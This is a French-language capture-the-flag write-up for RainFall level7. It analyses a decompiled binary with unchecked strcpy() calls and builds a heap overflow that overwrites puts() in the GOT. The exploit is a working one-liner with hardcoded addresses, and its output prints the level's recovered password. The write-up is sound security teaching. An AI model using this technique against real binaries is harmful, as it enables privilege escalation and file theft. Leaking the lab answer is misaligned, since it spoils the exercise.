## 0 - Test initial

```shell
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 rgfesr
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 rgfesr resger
~~
```
> Il semble que le programme a besoin de deux arguments pour fonctionner

## 1 - Analyse du code source

Version simplifiée du code source décompilé :

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Buffer global pour stocker le contenu du fichier .pass
char c[80];

// Structure représentant un élément avec un identifiant et un pointeur vers une chaîne
typedef struct {
    int id;
    char *str;
} element_t;

// Fonction qui affiche le contenu du buffer global avec un timestamp
int m() {
    time_t t = time(0);
    return printf("%s - %d\n", c, t);
}

// Fonction principale
int main(int argc, const char **argv) {
    element_t *elem1, *elem2;
    FILE *file;

    // Allocation de la première structure
    elem1 = malloc(sizeof(element_t));
    elem1->id = 1;
    elem1->str = malloc(8);

    // Allocation de la deuxième structure
    elem2 = malloc(sizeof(element_t));
    elem2->id = 2;
    elem2->str = malloc(8);

    // Copie des arguments dans les structures (VULNÉRABILITÉ: pas de vérification de taille)
    strcpy(elem1->str, argv[1]);
    strcpy(elem2->str, argv[2]);

    // Lecture du fichier .pass dans le buffer global
    file = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, file);
    
    puts("~~");
    return 0;
}
```

On voit donc que les deux arguments fournis sont copiés à deux adresses précises dans le code, puis le fichier ./pass de l'utilisateur level8 est lu et son contenu est stocké dans une variable qui n'est affichée que par une fonction normalement inatteignable lors de l'exécution classique du programme.

On voit que la fonction m imprime la variable globale où est stockée le contenu du fichier `.pass`, on veut donc remplacer la fonction `puts()` par cette fonction `m()`

En utilisant un buffer overflow, nous pouvons demander au programme d'écrire notre deuxième argument où nous le souhaitons en ajustant une adresse via l'offset du premier appel à strcpy(). Nous avons repéré un put() inutile qui n'apporte rien au déroulement du programme, donc comme dans un niveau précédent, nous pouvons utiliser un écrasement de la GOT (GOT Overwrite) pour rediriger l'exécution vers la fonction souhaitée.

## Récupérer les adresses des fonctions

```shell
level7@RainFall:~$ gdb ./level7 
[...]
(gdb) info functions
[...]
0x080484f4  m
(gdb) 
```

```shell
(gdb) disass puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928 <<<
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

For this exploit, we need:

    - Address of the puts() function (0x08049928) OK
    - Offset of first strcpy() (20 bytes) OK
    - Address of the wanted function (0x080484f4) OK

## Calcul de l'offset :

```shell
$> ltrace ./level7  `echo -e "import string\nprint ''.join([char * 4 for char in string.ascii_letters])" | python` "teststring"
__libc_start_main(0x8048521, 3, 0xbffff704, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                          = 0x0804a008
malloc(8)                                                                                          = 0x0804a018
malloc(8)                                                                                          = 0x0804a028
malloc(8)                                                                                          = 0x0804a038
strcpy(0x0804a018, "aaaabbbbccccddddeeeeffffgggghhhh"...)                                          = 0x0804a018
strcpy(0x66666666, "teststring" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

L’emplacement du pointeur elem1->str est : 0x0804a018

L’emplacement du pointeur elem2->str est : 0x804a02c
(car :
elem2 commence à 0x804a028
id = 4 octets
donc elem2->str = 0x804a028 + 4 = 0x804a02c)

----------------

Il suffit alors de faire en sorte que l’adresse de puts() soit copiée à l’emplacement cible du second strcpy(), puis d’écrire l’adresse de la fonction souhaitée à cet emplacement.

  $> ./level7 `python -c 'print "\x90"*20 + "\x08\x04\x99\x28"[::-1]'` `python -c 'print "\x08\x04\x84\xf4"[::-1]'`
  5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1649074015
  
